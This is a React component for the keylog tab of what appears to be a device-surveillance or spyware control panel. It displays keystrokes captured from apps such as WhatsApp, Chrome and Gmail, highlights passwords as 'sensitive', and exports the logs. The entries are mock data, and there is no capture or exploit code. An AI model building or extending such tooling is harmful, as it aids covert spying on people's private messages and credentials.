import React, { useState, useEffect } from 'react';
import { Card, CardHeader, CardTitle, CardContent, Badge } from '../ui';

interface KeylogTabProps {
  deviceId: string;
}

interface KeylogEntry {
  id: string;
  app: string;
  text: string;
  timestamp: string;
  isSensitive?: boolean;
}

export const KeylogTab: React.FC<KeylogTabProps> = ({ deviceId }) => {
  const [keylogs, setKeylogs] = useState<KeylogEntry[]>([
    {
      id: '1',
      app: 'WhatsApp',
      text: 'Hello, how are you?',
      timestamp: new Date(Date.now() - 600000).toISOString(),
      isSensitive: false,
    },
    {
      id: '2',
      app: 'Chrome',
      text: 'password: ••••••••',
      timestamp: new Date(Date.now() - 1200000).toISOString(),
      isSensitive: true,
    },
    {
      id: '3',
      app: 'Gmail',
      text: 'Meeting at 3 PM tomorrow',
      timestamp: new Date(Date.now() - 1800000).toISOString(),
      isSensitive: false,
    },
  ]);

  const [filterApp, setFilterApp] = useState<string>('all');
  const [searchText, setSearchText] = useState('');
  const [autoScroll, setAutoScroll] = useState(true);

  const apps = ['all', ...new Set(keylogs.map((k) => k.app))];

  const filteredKeylogs = keylogs
    .filter((k) => filterApp === 'all' || k.app === filterApp)
    .filter((k) => k.text.toLowerCase().includes(searchText.toLowerCase()));

  const exportKeylogs = (format: 'csv' | 'json') => {
    let data: string;
    let mimeType: string;
    let extension: string;

    if (format === 'json') {
      data = JSON.stringify(filteredKeylogs, null, 2);
      mimeType = 'application/json';
      extension = 'json';
    } else {
      const headers = ['Timestamp', 'App', 'Text', 'Sensitive'];
      const rows = filteredKeylogs.map((k) => [
        new Date(k.timestamp).toISOString(),
        k.app,
        k.text,
        k.isSensitive ? 'Yes' : 'No',
      ]);
      data = [headers, ...rows].map((row) => row.join(',')).join('\n');
      mimeType = 'text/csv';
      extension = 'csv';
    }

    const blob = new Blob([data], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylogs-${deviceId}-${Date.now()}.${extension}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  useEffect(() => {
    // Simulate real-time updates
    const interval = setInterval(() => {
      const newEntry: KeylogEntry = {
        id: Date.now().toString(),
        app: ['WhatsApp', 'Chrome', 'Gmail', 'Messenger'][Math.floor(Math.random() * 4)],
        text: 'New keylog entry...',
        timestamp: new Date().toISOString(),
        isSensitive: Math.random() > 0.8,
      };
      setKeylogs((prev) => [newEntry, ...prev].slice(0, 100)); // Keep last 100
    }, 10000); // Every 10 seconds

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="space-y-6">
      {/* Controls */}
      <Card variant="glass">
        <CardContent className="p-4">
          <div className="flex flex-wrap items-center gap-4">
            {/* Search */}
            <div className="flex-1 min-w-[200px]">
              <input
                type="text"
                value={searchText}
                onChange={(e) => setSearchText(e.target.value)}
                placeholder="Search keylogs..."
                className="w-full px-4 py-2 bg-white/5 border border-white/20 rounded-lg text-white placeholder:text-white/40 focus:outline-none focus:border-electric-500"
              />
            </div>

            {/* App Filter */}
            <select
              value={filterApp}
              onChange={(e) => setFilterApp(e.target.value)}
              className="px-4 py-2 bg-white/5 border border-white/20 rounded-lg text-white focus:outline-none focus:border-electric-500"
            >
              {apps.map((app) => (
                <option key={app} value={app} className="bg-dark-800">
                  {app === 'all' ? 'All Apps' : app}
                </option>
              ))}
            </select>

            {/* Auto Scroll */}
            <label className="flex items-center gap-2 cursor-pointer">
              <input
                type="checkbox"
                checked={autoScroll}
                onChange={(e) => setAutoScroll(e.target.checked)}
                className="w-4 h-4"
              />
              <span className="text-white/60 text-sm">Auto-scroll</span>
            </label>

            {/* Export */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => exportKeylogs('json')}
                className="px-3 py-2 bg-electric-500 hover:bg-electric-400 text-dark-900 rounded-lg text-sm font-medium transition-colors"
              >
                📥 JSON
              </button>
              <button
                onClick={() => exportKeylogs('csv')}
                className="px-3 py-2 bg-electric-500 hover:bg-electric-400 text-dark-900 rounded-lg text-sm font-medium transition-colors"
              >
                📥 CSV
              </button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Keylogs Stream */}
      <Card variant="glass">
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle>Keylog Stream</CardTitle>
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span className="text-sm text-white/60">Live</span>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-2 max-h-[600px] overflow-y-auto">
            {filteredKeylogs.length === 0 ? (
              <div className="text-center py-16 text-white/40">
                <div className="text-6xl mb-4">⌨️</div>
                <p>No keylogs found</p>
              </div>
            ) : (
              filteredKeylogs.map((entry) => (
                <KeylogCard key={entry.id} entry={entry} />
              ))
            )}
          </div>
        </CardContent>
      </Card>

      {/* Stats */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <Card variant="glass">
          <CardContent className="p-4 text-center">
            <div className="text-3xl font-bold text-electric-400">{keylogs.length}</div>
            <div className="text-sm text-white/60 mt-1">Total Entries</div>
          </CardContent>
        </Card>
        <Card variant="glass">
          <CardContent className="p-4 text-center">
            <div className="text-3xl font-bold text-red-400">
              {keylogs.filter((k) => k.isSensitive).length}
            </div>
            <div className="text-sm text-white/60 mt-1">Sensitive Data</div>
          </CardContent>
        </Card>
        <Card variant="glass">
          <CardContent className="p-4 text-center">
            <div className="text-3xl font-bold text-purple-400">{apps.length - 1}</div>
            <div className="text-sm text-white/60 mt-1">Apps Tracked</div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

const KeylogCard: React.FC<{ entry: KeylogEntry }> = ({ entry }) => {
  return (
    <div className="p-4 bg-white/5 rounded-lg hover:bg-white/10 transition-colors">
      <div className="flex items-start justify-between mb-2">
        <div className="flex items-center gap-2">
          <span className="text-sm font-medium text-white">{entry.app}</span>
          {entry.isSensitive && (
            <Badge variant="danger" size="sm">
              🔒 Sensitive
            </Badge>
          )}
        </div>
        <span className="text-xs text-white/40">
          {new Date(entry.timestamp).toLocaleTimeString()}
        </span>
      </div>
      <div className={`text-sm ${entry.isSensitive ? 'text-red-400' : 'text-white/80'}`}>
        {entry.text}
      </div>
    </div>
  );
};
